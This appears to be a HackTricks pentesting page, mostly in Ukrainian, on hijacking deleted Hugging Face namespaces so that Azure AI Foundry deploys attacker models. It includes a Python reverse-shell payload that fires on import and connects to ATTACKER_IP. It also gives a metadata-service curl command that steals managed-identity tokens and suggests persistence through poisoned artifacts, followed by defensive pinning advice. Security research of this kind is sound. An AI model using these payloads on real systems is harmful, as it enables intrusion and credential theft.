# Azure - AI Foundry Post-Exploitation через повторне використання простору імен моделі Hugging Face

{{#include ../../../banners/hacktricks-training.md}}

## Сценарій

- Каталог моделей Azure AI Foundry містить багато моделей Hugging Face (HF) для розгортання в один клік.
- Ідентифікатори моделей HF мають формат Author/ModelName. Якщо HF author/org видаляють, будь-хто може повторно зареєструвати цей авторський акаунт і опублікувати модель з тим самим ModelName на legacy-шляху.
- Pipelines та каталоги, які витягують лише за ім'ям (без commit pinning/цілісності), будуть посилатися на репозиторії, контрольовані атакуючим. Коли Azure розгортає модель, код завантажувача (loader) може виконатися в середовищі endpoint'а, надаючи RCE з правами цього endpoint'а.

Поширені випадки takeover HF:
- Ownership deletion: старий шлях повертає 404 до моменту захоплення.
- Ownership transfer: старий шлях повертає 307 на нового автора, поки старий автор існує. Якщо старого автора пізніше видалено і повторно зареєстровано, перенаправлення ламається, і репозиторій атакуючого обслуговується на legacy-шляху.

## Виявлення іменних просторів, придатних для повторного використання (HF)
```bash
# Check author/org existence
curl -I https://huggingface.co/<Author>        # 200 exists, 404 deleted/available

# Check model path
curl -I https://huggingface.co/<Author>/<ModelName>
# 307 -> redirect (transfer case), 404 -> deleted until takeover
```
## End-to-end Attack Flow against Azure AI Foundry

1) У Model Catalog знайдіть HF models, у яких оригінальні автори були видалені або передані (old author removed) на HF.  
2) Повторно зареєструйте покинутого автора на HF і відтворіть ModelName.  
3) Опублікуйте зловмисний repo з loader code, який виконується при import або потребує trust_remote_code=True.  
4) Розгорніть у Azure AI Foundry спадщинний Author/ModelName. Платформа витягує репозиторій нападника; loader виконується всередині Azure endpoint container/VM, що дає RCE з правами endpoint.

Example payload fragment executed on import (for demonstration only):
```python
# __init__.py or a module imported by the model loader
import os, socket, subprocess, threading

def _rs(host, port):
s = socket.socket(); s.connect((host, port))
for fd in (0,1,2):
try:
os.dup2(s.fileno(), fd)
except Exception:
pass
subprocess.call(["/bin/sh","-i"])  # or powershell on Windows images

if os.environ.get("AZUREML_ENDPOINT","1") == "1":
threading.Thread(target=_rs, args=("ATTACKER_IP", 4444), daemon=True).start()
```
Примітки
- AI Foundry deployments that integrate HF typically clone and import repo modules referenced by the model’s config (e.g., auto_map), which can trigger code execution. Some paths require trust_remote_code=True.
- Access usually matches the endpoint’s managed identity/service principal permissions. Treat it as an initial access foothold for data access and lateral movement within Azure.

## Поради після експлуатації (Azure Endpoint)

- Перелічте змінні середовища та MSI endpoints для токенів:
```bash
# Azure Instance Metadata Service (inside Azure compute)
curl -H "Metadata: true" \
"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```
- Перевірте змонтоване сховище, артефакти моделі та доступні Azure services за допомогою отриманого token.
- Розгляньте persistence, залишивши отруєні артефакти моделі, якщо платформа повторно витягує з HF.

## Рекомендації з захисту для користувачів Azure AI Foundry

- Закріплюйте моделі за commit під час завантаження з HF:
```python
from transformers import AutoModel
m = AutoModel.from_pretrained("Author/ModelName", revision="<COMMIT_HASH>")
```
- Розміщуйте перевірені HF models у довірчому внутрішньому registry та розгортайте звідти.
- Постійно скануйте codebases та defaults/docstrings/notebooks на предмет жорстко вбудованих Author/ModelName, які видалені/перенесені; оновлюйте або зафіксуйте (pin).
- Перевіряйте існування author та походження (provenance) model перед розгортанням.

## Евристики розпізнавання (HTTP)

- Видалений author: сторінка author повертає 404; legacy model path повертає 404 до моменту takeover.
- Transferred model: legacy path повертає 307 на нового author поки старий author існує; якщо старий author пізніше видаляють і повторно реєструють, legacy path може сервувати зловмисний контент.
```bash
curl -I https://huggingface.co/<OldAuthor>/<ModelName> | egrep "^HTTP|^location"
```
## Перехресні посилання

- Див. загальну методологію та нотатки щодо ланцюга постачання:

{{#ref}}
../../pentesting-cloud-methodology.md
{{#endref}}

## Посилання

- [Model Namespace Reuse: An AI Supply-Chain Attack Exploiting Model Name Trust (Unit 42)](https://unit42.paloaltonetworks.com/model-namespace-reuse/)
- [Hugging Face: Renaming or transferring a repo](https://huggingface.co/docs/hub/repositories-settings#renaming-or-transferring-a-repo)

{{#include ../../../banners/hacktricks-training.md}}
